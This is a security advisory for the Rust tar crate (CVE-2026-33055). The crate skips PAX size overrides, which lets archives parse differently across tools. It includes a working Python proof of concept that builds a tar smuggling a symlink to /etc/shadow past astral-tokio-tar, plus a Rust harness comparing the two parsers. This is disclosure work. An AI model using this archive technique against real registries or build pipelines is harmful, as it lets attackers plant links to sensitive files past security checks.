# [M] tar-rs incorrectly ignores PAX size headers if header size is nonzero

## Summary
Severity: Medium
Advisory: GHSA-gchp-q4r4-x4ff
CVE: CVE-2026-33055
CWE: CWE-843
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-gchp-q4r4-x4ff
Type: github-advisory

## Affected
- crates.io: `tar` — affected >=0 <0.4.45

## Details
### Summary

As part of [CVE-2025-62518](https://www.cve.org/CVERecord?id=CVE-2025-62518) the astral-tokio-tar project was changed to correctly honor PAX size headers in the case where it was different from the base header.

However, it was missed at the time that this project (the original Rust `tar` crate) had a conditional logic that skipped the PAX size header in the case that the base header size was nonzero - almost the inverse of the astral-tokio-tar issue.

The problem here is that *any* discrepancy in how tar parsers honor file size can be used to create archives that appear differently when unpacked by different archivers.

In this case, the tar-rs (Rust `tar`) crate is an outlier in checking for the header size - other tar parsers (including e.g. Go `archive/tar`) unconditionally use the PAX size override.


### Details

https://github.com/astral-sh/tokio-tar/blob/aafc2926f2034d6b3ad108e52d4cfc73df5d47a4/src/archive.rs#L578-L600
https://github.com/alexcrichton/tar-rs/blob/88b1e3b0da65b0c5b9750d1a75516145488f4793/src/archive.rs#L339-L344

### PoC

(originally posted by https://github.com/xokdvium)


> I was worried that cargo might be vulnerable to malicious crates, but it turns out that crates.io has been rejecting both symlinks and hard links:

It seems like recent fixes to https://edera.dev/stories/tarmageddon have introduced a differential that could be used to smuggle symlinks into the registry that would get skipped over by `astral-tokio-tar` but not by `tar-rs`.

https://github.com/astral-sh/tokio-tar/blob/aafc2926f2034d6b3ad108e52d4cfc73df5d47a4/src/archive.rs#L578-L600
https://github.com/alexcrichton/tar-rs/blob/88b1e3b0da65b0c5b9750d1a75516145488f4793/src/archive.rs#L339-L344

```python
#!/usr/bin/env python3
B = 512


def pad(d):
    r = len(d) % B
    return d + b"\0" * (B - r) if r else d


def hdr(name, size, typ=b"0", link=b""):
    h = bytearray(B)
    h[0 : len(name)] = name
    h[100:107] = b"0000644"
    h[108:115] = h[116:123] = b"0001000"
    h[124:135] = f"{size:011o}".encode()
    h[136:147] = b"00000000000"
    h[148:156] = b"        "
    h[156:157] = typ
    if link:
        h[157 : 157 + len(link)] = link
    h[257:263] = b"ustar\x00"
    h[263:265] = b"00"
    h[148:155] = f"{sum(h):06o}\x00".encode()
    return bytes(h)


INFLATED = 2048
pax_rec = b"13 size=2048\n"

ar = bytearray()
ar += hdr(b"./PaxHeaders/regular", len(pax_rec), typ=b"x")
ar += pad(pax_rec)

content = b"regular\n"
ar += hdr(b"regular.txt", len(content))
mark = len(ar)
ar += pad(content)

ar += hdr(b"smuggled", 0, typ=b"2", link=b"/etc/shadow")
ar += b"\0" * B * 2

used = len(ar) - mark
if used < INFLATED:
    ar += b"\0" * (((INFLATED - used + B - 1) // B) * B)
ar += b"\0" * B * 2

open("smuggle.tar", "wb").write(bytes(ar))
```

`tar-rs` and `astral-tokio-tar` parse it differently, with `astral-tokio-tar` skipping over the symlink (so presumably the check from https://github.com/rust-lang/crates.io/blob/795a4f85dec436f2531329054a4cfddeb684f5c5/crates/crates_io_tarball/src/lib.rs#L92-L102 wouldn't disallow it).

```rust
use std::fs;
use std::path::PathBuf;

fn sync_parse(data: &[u8]) {
    println!("tar:");
    let mut ar = tar::Archive::new(data);
    for e in ar.entries().unwrap() {
        let e = e.unwrap();
        let path = e.path().unwrap().to_path_buf();
        let kind = e.header().entry_type();
        let link: Option<PathBuf> = e.link_name().ok().flatten().map(|l| l.to_path_buf());
        match link {
            Some(l) => println!("  {:20} {:?} -> {}", path.display(), kind, l.display()),
            None => println!("  {:20} {:?}", path.display(), kind),
        }
    }
    println!();
}

async fn async_parse(data: Vec<u8>) {
    println!("astral-tokio-tar:");
    let mut ar = tokio_tar::Archive::new(data.as_slice());
    let mut entries = ar.entries().unwrap();
    while let Some(e) = tokio_stream::StreamExt::next(&mut entries).await {
        let e = e.unwrap();
        let path = e.path().unwrap().to_path_buf();
        let kind = e.header().entry_type();
        let link: Option<PathBuf> = e.link_name().ok().flatten().map(|l| l.to_path_buf());
        match link {
            Some(l) => println!("  {:20} {:?} -> {}", path.display(), kind, l.display()),
            None => println!("  {:20} {:?}", path.display(), kind),
        }
    }
    println!();
}

#[tokio::main]
async fn main() {
    let path = std::env::args().nth(1).unwrap_or("smuggle.tar".into());
    let data = fs::read(&path).unwrap();
    sync_parse(&data);
    async_parse(data).await;
}
```

```
tar:
  regular.txt          Regular
  smuggled             Symlink -> /etc/shadow

astral-tokio-tar:
  regular.txt          Regular
```

### Impact

This can affect anything that uses the `tar` crate to parse archives and expects to have a consistent view with other parsers. In particular it is known to affect crates.io which uses `astral-tokio-tar` to parse, but cargo uses `tar`.

## References
- https://github.com/alexcrichton/tar-rs/security/advisories/GHSA-gchp-q4r4-x4ff
- https://github.com/composefs/tar-rs/security/advisories/GHSA-gchp-q4r4-x4ff
- https://nvd.nist.gov/vuln/detail/CVE-2026-33055
- https://github.com/alexcrichton/tar-rs/commit/de1a5870e603758f430073688691165f21a33946
- https://github.com/alexcrichton/tar-rs
- https://rustsec.org/advisories/RUSTSEC-2026-0068.html
- https://www.cve.org/CVERecord?id=CVE-2025-62518
